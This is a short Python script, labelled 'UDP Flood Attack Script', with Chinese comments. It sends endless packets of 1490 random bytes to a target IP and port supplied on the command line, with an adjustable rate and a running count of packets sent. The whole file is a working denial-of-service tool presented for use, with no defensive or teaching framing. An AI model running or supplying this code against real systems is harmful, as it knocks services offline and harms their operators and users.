import time
import socket
import random
import argparse
import sys


def attack(ip, t, port=80):
    # 创建 UDP 套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)  # 生成随机数据包
    count = 0
    while True:
        # 发送数据包
        sock.sendto(bytes, (ip, port))
        count += 1
        print(f"已发送 {count} 个数据包到 {ip} 端口 {port}")
        # 控制发送速率
        time.sleep((1000 - t) / 2000)


if __name__ == "__main__":
    # 创建命令行参数解析器
    parser = argparse.ArgumentParser(description="UDP Flood Attack Script")
    parser.add_argument("-ip", required=True, help="目标服务器的 IP 地址 (必填)")
    parser.add_argument("-port", type=int, default=80, help="目标服务器的端口，默认为 80")
    parser.add_argument("-speed", type=int, default=1000, help="数据包发送速度，范围 1-1000，默认为 1000")

    # 解析参数
    args = parser.parse_args()

    # 检查 IP 参数是否为空
    if not args.ip:
        parser.print_help()
        sys.exit(1)

    # 启动攻击
    print(f"攻击目标: IP = {args.ip}, Port = {args.port}, Speed = {args.speed}")
    attack(args.ip, args.speed, args.port)
